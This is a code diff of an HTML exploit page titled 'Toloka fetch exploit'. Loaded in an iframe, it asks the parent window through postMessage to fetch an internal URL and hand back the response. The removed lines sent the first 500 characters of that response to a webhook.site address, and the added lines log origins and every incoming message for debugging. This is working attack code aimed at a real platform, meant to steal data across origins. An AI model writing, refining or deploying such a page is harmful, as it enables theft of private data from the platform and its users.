@@ -2,11 +2,11 @@
 <html>
 <head>
   <meta charset="utf-8" />
-  <title>fetch exploit</title>
-  <style>body{font-family:sans-serif;padding:20px}</style>
+  <title>fetch exploit debug</title>
+  <style>body { font-family: sans-serif; padding: 20px; }</style>
 </head>
 <body>
-  <h2 style="color:red">Toloka fetch exploit</h2>
+  <h2 style="color:red">Toloka fetch exploit (debug)</h2>
   <pre id="log"></pre>
 
 <script>
@@ -15,22 +15,27 @@ const log = (msg) => {
   document.getElementById('log').textContent += msg + '\n';
 };
 
+log("[i] iframe origin: " + window.origin);
+try {
+  log("[i] parent origin: " + window.parent.origin);  // قد يعطي Access Denied
+} catch (e) {
+  log("[!] Cannot access window.parent.origin: " + e);
+}
+
 const id = crypto.randomUUID();
 
+// 🔍 Step 1: Listen for ANY message from parent
 window.addEventListener("message", function handler(e) {
+  console.log("[DEBUG] Received message:", e.data);
+  log("[DEBUG] Received message from " + e.origin + ": " + JSON.stringify(e.data));
+
   if (e.data?.id === id && e.data?.name === 'fetch:response') {
     log("[✔] Data received from parent!");
     log("Length: " + e.data.payload.length);
-    fetch("https://webhook.site/2106b9ef-aafe-498c-b8e0-bef7c35b92f3", {
-      method: "POST",
-      headers: { "Content-Type": "text/plain" },
-      body: e.data.payload.slice(0, 500)
-    });
-    window.removeEventListener("message", handler);
   }
 });
 
-// اطلب من النافذة الأم أن تنفذ fetch إلى /editor أو أي URL داخلي
+// 🔁 Step 2: Send fetch request via postMessage
 window.parent.postMessage({
   id,
   name: "fetch",
